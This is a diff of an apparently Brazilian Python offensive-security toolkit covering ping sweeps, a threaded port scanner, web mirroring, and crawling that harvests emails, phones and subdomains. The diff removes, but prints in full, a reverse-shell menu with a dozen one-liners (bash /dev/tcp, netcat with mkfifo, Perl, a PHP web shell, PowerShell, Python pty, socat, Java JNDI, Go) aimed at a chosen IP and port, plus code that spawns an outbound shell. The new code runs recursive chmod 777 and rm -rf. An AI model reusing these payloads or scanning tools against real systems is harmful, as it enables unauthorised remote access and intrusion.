@@ -1,5 +1,5 @@
 #!/usr/bin/env python3
-version = "v3.91-dev"
+version = "v3.92-dev"
 
 import os
 import re
@@ -98,102 +98,7 @@ def interfaces():
 ## FUNÇÃO PARA DESCOBERTA DE HOSTS NA REDE ##
 #############################################
 def host_discovery():
-    '''
-    ##########################################################
-    ## CRIA UMA LISTA DE IP DE ACORDO COM A FAIXA FORNECIDA ##
-    ##########################################################
-    vrf_ip = input('Digite a faixa de IP (Ex: xx.xx.xx.xx/xx): ')
-    mask = vrf_ip.split('/')
 
-    ############################################
-    ## CRIA UMA VARIAVEL COM O PADRÃO DE IPV4 ##
-    ############################################
-    regex = re.compile(r"^(\d{1,3}\.)\d{1,3}\.\d{1,3}\.\d{1,3}$")
-
-    try:
-        ##################################
-        ## TRATAMENTO DE "VAZIO" E MASK ##
-        ##################################
-        if regex.match(mask[0]) is not None and int(mask[1]) <= 32:
-                
-            try:
-                rede = ipaddress.ip_network(vrf_ip, strict=False)
-
-                ips = list(map(str, rede.hosts()))
-                if ips:
-
-                    for ip in ips:
-                        list_ip.append(ip)
-                else:
-                    print("Não foi possível gerar a lista de IPs.")
-
-            except ValueError as e:
-                print("Erro:", e)
-
-        else:
-            print('\nDigite uma Faixa válida (Ex: 192.168.0.0/16).')
-            host_discovery()
-
-    except IndexError as e:
-        print("Digite o /xx da Rede.")
-        input(press)
-        host_discovery()
-
-    #########################################################
-    #################### !!! ALERTA !!! #####################
-    #########################################################
-    print('\n\033[7;31m((Para cancelar segure CTRL+C))\033[m')
-
-    interface = interfaces()
-
-    ###################################################
-    ## CRIA PASTA "ARQ" E REMOVE OS ARQUIVOS ANTIGOS ##
-    ###################################################
-    os.system(dir)
-    os.popen('rm ARQ/hosts.txt 2>/dev/null')
-
-    print('\n\033[7;32mAguarde ...\033[m')
-
-    #########################################################
-    ## REALIZA UM PING EM CADA IP NA INTERFACE SELECIONADA ##
-    #########################################################
-    try:
-        def ping(interface,host):
-            result = os.system(f'ping -c 3 -W 1 -I {interface} {host} > /dev/null')
-            if result == 0:
-                with open('ARQ/hosts.txt','a') as h:
-                    print(host, file=h)
-                print(host)
-        
-        #####################################################
-        ## CRIA UMA POOL DE THREADING PARA A FUNÇÃO "PING" ##
-        #####################################################
-        thread = 800
-
-        try:
-            with exx(max_workers=int(thread)) as exe:
-                for host in list_ip:
-                    exe.submit(ping,interface, host)
-                    t.sleep(0.05)
-            
-        except KeyboardInterrupt:
-                    print('\n'+Ctrl_C)
-                    quit()
-        
-        input(press)
-        main()
-    
-    except RuntimeError as er:
-        print(er)
-        quit()
-    
-    except FileNotFoundError:
-        print("\nO arquivo de IPs descobertos deve ser gerado.")
-
-    else:
-        input(press)
-        main()
-    '''
     #######################
     ## VARIAVEIS GLOBAIS ##
     #######################
@@ -323,7 +228,6 @@ def host_discovery():
     t_ping.start()
 
 
-
 #=======================================================================================
 ##########################################
 ## FAZ RESOLUÇÃO DE HOSTNAME VIA SOCKET ##
@@ -425,10 +329,17 @@ def bigscan():
                         except KeyboardInterrupt:
                             print("[-] Saindo!")
                             quit()
+
         ##############################################
         ## EM CASO DE DE COMUNICAÇÃO, EXIBE UM ERRO ##
         ##############################################
-        except (socket.timeout, ConnectionRefusedError, OSError) as err:
+        except (socket.timeout) as err:
+            print(f"Timeout: Porta {port} em {ip}: {err}")
+
+        except ConnectionRefusedError as err:
+            print(f"Conexão recusada: Porta {port} em {ip}: {err}")
+
+        except OSError as err:
             print(f"Erro ao verificar porta {port} em {ip}: {err}")
 
         finally:
@@ -470,7 +381,7 @@ def bigscan():
                     print("[-] Saindo!")
                     quit()
 
-            #open_ports = [port for port in ports if futures[port].result()] #### NÃO LEMBRO PRA QUE SERVE KKKK
+            open_ports = [port for port in ports if futures[port].result()]
         
         except KeyboardInterrupt:
             print('\n[!] Saindo...')
@@ -489,8 +400,7 @@ def bigscan():
     ## PORTSCANNER COM SOCKET TCP, NO RANGE INFORMADO ##
     ####################################################
     def portscan():
-        os.popen('rm ARQ/portscan.txt 2>/dev/null')
-
+        
         try:
             with open(f"ARQ/hosts.txt", "r") as f:
                 lst = f.readlines()
@@ -527,7 +437,9 @@ def bigscan():
                     try:
                         for port in ports:
                             exe.submit(scan, host, port, len(str(port)))
-                    
+                            t.sleep(0.4)
+                    except RuntimeError as err:
+                        print(err)
                     except KeyboardInterrupt:
                         print("[-] Saindo!")
                         quit()
@@ -550,10 +462,12 @@ def bigscan():
     ## SOLICITA UMA ENTRADA PARA EXECUTAR O PORTSCAN POR HOST OU LISTA ##
     #####################################################################
     sit_scan = input('Deseja utilizar um (H)ost ou a (L)ista? (H/L): ')
+
     if sit_scan.lower() == 'h':
         portscan_uniq()
 
     elif sit_scan.lower() == 'l':
+        os.popen('rm ARQ/portscan.txt 2>/dev/null')
         portscan()
 
     else:
@@ -610,7 +524,7 @@ def http_finder():
     def wget_pg(ip, porta):
         os.system(f"rm ARQ/WEB/{ip}.html")
         os.system(f'wget --no-check-certificate --mirror --convert-links --adjust-extension --page-requisites --timeout=10 http://{ip}:{porta} -P ARQ/WEB/')
-    
+        os.system(f'chmod 777 -R ARQ/WEB/{ip}')
     
     for ip in os.listdir("ARQ/HEAD"):
         arquivo = os.path.join("ARQ/HEAD", ip)
@@ -658,17 +572,21 @@ def cert_subdomain():
 
 #=======================================================================================
 def link():
+
     def crawl(url):
         try:
             response = requests.get(url)
+
         except SSLError as e:
             print(f"SSLError: {e}")
             return []
+
         if response.status_code == 200:
             soup = BeautifulSoup(response.content, 'html.parser')
             links = soup.find_all('a')
             hrefcode = {urljoin(url, link['href']) for link in links if 'href' in link.attrs}
             return hrefcode
+
         return []
 
     def ext_info(url):
@@ -681,8 +599,10 @@ def link():
         try:
             response = requests.get(url)
         except SSLError as e:
+
             print(f"SSLError: {e}")
             return durls, emails, tel, forms, subdomains
+
         except requests.exceptions.RequestException as e:
             print(f"RequestException: {e}")
             return durls, emails, tel, forms, subdomains
@@ -692,21 +612,28 @@ def link():
 
             for link in soup.find_all('a'):
                 href = link.get('href')
+                
                 if link is soup.find('id'):
                     print(link)
+
                 elif link is not None:
                     try:
                         if href and href.startswith('/') or href.startswith('?'):
                             durls.append(urljoin(url, href))
+
                         else:
                             print(href)
+
                     except AttributeError as e:
                         print(link,href,e)
+
             for link in soup.find_all('a'):
                 href = link.get('href')
+
                 if href:
                     if href.startswith("mailto:"):
                         emails.add(href[7:])
+
                     elif href.startswith("tel:") or "phone=" in href:
                         tel.add(href[4:])
 
@@ -715,19 +642,24 @@ def link():
 
             for link in soup.find_all('a'):
                 href = link.get('href')
+
                 if href:
                     parsed_uri = urlparse(href)
                     domain = '{uri.netloc}'.format(uri=parsed_uri).split(':')[0]
                     subdomains.add(domain)
+
         return durls, emails, tel, forms, subdomains #######################################  LEMBRAR COMO FUNCIONA
 
     def process_url(url):
         visit_urls = set()
+
         if url in visit_urls:
             return
+
         visit_urls.add(url)
         divurls = crawl(url)
         print("\n\nEfetuando WebCrawling em ", url)
+
         for divurl in sorted(divurls):
             print('\n\033[0;31m============================================================================================>>\033[m',t.strftime("\033[7;32m %d/%m/%y \033[m"))
             print(divurl)
@@ -768,21 +700,24 @@ def link():
         url_process = ['http://' + target]
         url_atual = url_process.pop()
         process_url(url_atual)
-        sit = input('\nDeseja salvar qo WebCrawl? (S/N) ')
-        if(sit.lower() == 's'):
-            print('Aguarde enquanto o arquivo está sendo salvo ...')
-            with open(f'{target}_craw.txt', 'w') as f:
-                while url_process:
-                    url_atual = url_process.pop()
-                    os.dup2(f.fileno(), 1)
-                    process_url(url_atual)
-                    os.dup2(os.dup(2), 1)
-            print("WebCrawler salvo com sucesso!")
+        with open(f'Crawl/{target}_craw.txt', 'w') as f:
+            while url_process:
+                os.dup2(f.fileno(), 1)
+                process_url(url_atual)
+                os.dup2(os.dup(2), 1)
+
     interface = interfaces()
+
+    os.popen('rm -rf Crawl 2>/dev/null')
+    t.sleep(1)
+    os.popen('mkdir Crawl 2>/dev/null') 
+
     sit_scan = input('Deseja utilizar um (H)ost ou a (L)ista? (H/L): ')
+
     if (sit_scan.lower() == 'h'):
         target = input('Digite o endereço do site: (site.com)\n')
         links(target)
+
     elif (sit_scan.lower() == 'l'):
         for ip in os.listdir("ARQ/WEB"):
             parse_ip = ip.split(':')
@@ -1822,6 +1757,7 @@ EG      LE.     ;##D.    L##, .fLLLLLLLLLLLLi   ;##D.    L##,
     except KeyboardInterrupt:
         print("\nPrograma encerrado.")
 
+
 #=======================================================================================
 def suid():
     path = input('Digite o caminho a ser pesquisado: ')
@@ -1857,129 +1793,8 @@ def nc(porta):
         print('\n'+Ctrl_C)
 
 def reverse_shell():
-    
-    def display_reverse_shell_options(options):
-        for idx, option in options.items():
-            print(f'{idx}. {option["label"]}')
-        print('')
+   pass
 
-    try:
-        ip = input('Digite o IP: ')
-        porta = int(input('Digite a Porta: '))
-
-        options = {
-            1: {"label": "|BASH|", "commands": ['sh -i >& /dev/tcp/{}/{} 0>&1'.format(ip, porta),
-                                                '0<&196;exec 196<>/dev/tcp/{}/{}; sh <&196 >&196 2>&196'.format(ip, porta),
-                                                'exec 5<>/dev/tcp/{}/{};cat <&5 | while read line; do $line 2>&5 >&5; done'.format(ip, porta),
-                                                'sh -i 5<> /dev/tcp/{}/{} 0<&5 1>&5 2>&5',
-                                                'sh -i >& /dev/udp/{}/{} 0>&1']},
-            2: {"label": "|NETCAT|", "commands": ['rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc {} {} >/tmp/f'.format(ip, porta),
-                                                    'nc {} {} -e sh'.format(ip, porta)]},
-            3: {"label": "|RUST|", "commands": ['rcat {} {} -r sh'.format(ip, porta)]},
-            4: {"label": "|PERL|", "commands": [
-                """perl -e 'use Socket;$i="SEUIP";$p=SUAPORTA;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("sh -i");};'""",
-                """perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"{}:{}");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'""".format(
-                    ip, porta)]},
-            5: {"label": "|PHP|", "commands": [
-                """ <?php if(isset($_REQUEST['cmd'])){ echo "<pre>"; $cmd = ($_REQUEST['cmd']); system($cmd); echo "</pre>"; die; }?> """,
-                """php -r '$sock=fsockopen("{}",{});exec("sh <&3 >&3 2>&3");'""".format(ip, porta),
-                """php -r '$sock=fsockopen("{}",{});shell_exec("sh <&3 >&3 2>&3");'""".format(ip, porta)]},
-            6: {"label": "|POWERSHELL|", "commands": [
-                """powershell -e client = New-Object System.Net.Sockets.TCPClient("192.168.0.192",4545);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()""",
-            ]},
-            7: {"label": "|PYTHON|", "commands": [
-                """export RHOST="{}";export RPORT={};python3 -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("sh")'""".format(
-                    ip, porta),
-                """python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{}",{}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'""".format(
-                    ip, porta)]},
-            8: {"label": "|SOCAT|", "commands": [
-                """socat TCP:{}:{} EXEC:sh""".format(ip, porta),
-                """socat TCP:{}:{} EXEC:'sh',pty,stderr,setsid,sigint,sane""".format(ip, porta)]},
-            9: {"label": "|NODE|", "commands": [
-                """require('child_process').exec('nc -e sh {} {}')""".format(ip, porta)]},
-            10: {"label": "|JAVASCRIPT|", "commands": [
-                """String command = "var host = 'SEUIP';" +
-                            "var port = SUAPORTA;" +
-                            "var cmd = 'sh';"+
-                            "var s = new java.net.Socket(host, port);" +
-                            "var p = new java.lang.ProcessBuilder(cmd).redirectErrorStream(true).start();"+
-                            "var pi = p.getInputStream(), pe = p.getErrorStream(), si = s.getInputStream();"+
-                            "var po = p.getOutputStream(), so = s.getOutputStream();"+
-                            "print ('Connected');"+
-                            "while (!s.isClosed()) {"+
-                            "    while (pi.available() > 0)"+
-                            "        so.write(pi.read());"+
-                            "    while (pe.available() > 0)"+
-                            "        so.write(pe.read());"+
-                            "    while (si.available() > 0)"+
-                            "        po.write(si.read());"+
-                            "    so.flush();"+
-                            "    po.flush();"+
-                            "    java.lang.Thread.sleep(50);"+
-                            "    try {"+
-                            "        p.exitValue();"+
-                            "        break;"+
-                            "    }"+
-                            "    catch (e) {"+
-                            "    }"+
-                            "}"+
-                            "p.destroy();"+
-                            "s.close();";
-                String x = "\"\".getClass().forName(\"javax.script.ScriptEngineManager\").newInstance().getEngineByName(\"JavaScript\").eval(\""+command+"\")";
-                ref.add(new StringRefAddr("x", x);"""]},
-            11: {"label": "|TELNET|", "commands": [
-                'TF=$(mktemp -u);mkfifo $TF && telnet {} {} 0<$TF | sh 1>$TF'.format(ip, porta)]},
-            12: {"label": "|ZSH|", "commands": [
-                """zsh -c 'zmodload zsh/net/tcp && ztcp {} {} && zsh >&$REPLY 2>&$REPLY 0>&$REPLY'""".format(
-                    ip, porta)]},
-            13: {"label": "|GOLANG|", "commands": [
-                """echo 'package main;import"os/exec";import"net";func main(){c,_:=net.Dial("tcp","SEUIP","SUAPORTA");cmd:=exec.Command("sh");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' > /tmp/t.go && go run /tmp/t.go && rm /tmp/t.go"""]},
-            0: {"label": "Voltar", "commands": []}
-        }
-
-        while True:
-            print('''
-Você deseja Pesquisar ou Executar?
-\033[0;34m[1]\033[m Pesquisar  \033[0;34m[2]\033[m Executar \033[0;34m[0]\033[m Voltar
-            ''')
-            sit_rev = int(input('Escolha uma opção: '))
-
-            if sit_rev == 1:
-                display_reverse_shell_options(options)
-                revsit = int(input('Escolha uma opção: '))
-
-                if revsit in options:
-                    print('')
-                    print(options[revsit]["label"])
-                    for command in options[revsit]["commands"]:
-                        print(f'-\033[0;31m {command}\033[m')
-                    print('')
-                    input('Pressione Enter para continuar...')
-                else:
-                    print('Digite uma opção válida!')
-            elif sit_rev == 2:
-                try:
-                    #s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-                    s.connect((ip, porta))
-                    print('Conectado com Sucesso!')
-                    comando = """python3 -c 'import pty;pty.spawn("/bin/bash")'"""
-                    print(f"Sugestão de comando: {comando}")
-                    os.dup2(s.fileno(), 0)
-                    os.dup2(s.fileno(), 1)
-                    os.dup2(s.fileno(), 2)
-                    os.system("/bin/sh -i")
-                except OSError:
-                    print('\033[0;31mHost não alcançado\033[m')
-            elif sit_rev == 0:
-                input('Pressione Enter para voltar...')
-                break
-            else:
-                print('Digite uma opção válida!')
-
-    except ValueError:
-        print('Digite uma opção válida!')
-    except Exception as e:
-        print(f'Erro: {e}')
 
 #=======================================================================================
 def server_tcp():
@@ -2294,11 +2109,27 @@ def banner():
         input(press)
         main()
 
+############################################
+## VERIFICA SE AS BIBLIOTECAS NECESSÁRIAS ##
+############################################
+def vrf_requisites():
+    pip3 = ['beautifulsoup4','requests']
+    awk = "awk '{print $1}'"
+    beautifulsoup4 = os.popen(f"sudo pip3 list | grep {pip3[0]} | {awk}").read()
+    requests = os.popen(f'sudo pip3 list | grep {pip3[1]} | {awk}').read()
+
+    if 'beautifulsoup4' not in beautifulsoup4:
+        os.system('pip3 install bs4 --break-system-packages')
+    
+    if 'requests' not in requests:
+        os.system('pip3 install requests --break-system-packages')
 
 ################################
 ## FUNÇÃO PRINCIPAL DO CÓDIGO ##
 ################################
 def main():
+
+    vrf_requisites()       
     if os.geteuid() == 0:
         try:
             banner()
@@ -2316,5 +2147,5 @@ def main():
 
 ##############
 ## EXECUÇÃO ##
-##############            
+##############     
 main()
